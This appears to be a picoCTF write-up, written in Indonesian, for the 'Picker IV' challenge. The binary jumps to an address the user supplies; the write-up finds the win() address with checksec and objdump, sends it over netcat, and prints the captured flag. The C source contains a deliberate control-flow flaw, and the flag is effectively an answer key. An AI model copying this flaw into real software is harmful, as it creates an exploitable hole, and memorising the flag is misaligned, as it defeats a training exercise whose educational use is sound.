<h1>Picker IV</h1>
<h3>Description</h3>
<pre>
Can you figure out how this program works to get the flag?
Connect to the program with netcat:
$ nc saturn.picoctf.net 63234
The program's source code can be downloaded <a href='https://artifacts.picoctf.net/c/528/picker-IV.c'>here</a>. The binary can be downloaded <a href='https://artifacts.picoctf.net/c/528/picker-IV'>here</a>.
</pre>
<h3>Solution</h3>
<p>Lakukan checksec pada program</p>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# checksec --file=picker-IV
[*] '/home/venom/Downloads/picker-IV'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<p>Didapatkan beberapa Warning salah satunya No PIE dan beberapanya</p>

```c
int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
<p>pada fungsi main ada warning <strong>void (*foo)(void) = (void (*)())val</strong>, yang dapat mengeksekusi fungsi dengan memanggil address dari fungsi lain</p>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# objdump -d picker-IV| awk '/<win>:/,/^$/' 
000000000040129e <win>:
  40129e:	f3 0f 1e fa          	endbr64
  4012a2:	55                   	push   %rbp
  4012a3:	48 89 e5             	mov    %rsp,%rbp
  4012a6:	48 83 ec 10          	sub    $0x10,%rsp
  4012aa:	48 8d 3d 74 0d 00 00 	lea    0xd74(%rip),%rdi        # 402025 <_IO_stdin_used+0x25>
  4012b1:	e8 3a fe ff ff       	call   4010f0 <puts@plt>
  4012b6:	48 8d 35 71 0d 00 00 	lea    0xd71(%rip),%rsi        # 40202e <_IO_stdin_used+0x2e>
  4012bd:	48 8d 3d 6c 0d 00 00 	lea    0xd6c(%rip),%rdi        # 402030 <_IO_stdin_used+0x30>
  4012c4:	e8 87 fe ff ff       	call   401150 <fopen@plt>
  4012c9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4012cd:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
  4012d2:	75 16                	jne    4012ea <win+0x4c>
  4012d4:	48 8d 3d 5e 0d 00 00 	lea    0xd5e(%rip),%rdi        # 402039 <_IO_stdin_used+0x39>
  4012db:	e8 10 fe ff ff       	call   4010f0 <puts@plt>
  ....................................................................
```
<p>Ambil address win() dan eksekusi pada server nc</p>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# nc saturn.picoctf.net 63234
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
```
<p>Input address dari fungsi win() dan eksekusi</p>
<h3>Flag</h3>
<pre>
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
</pre>
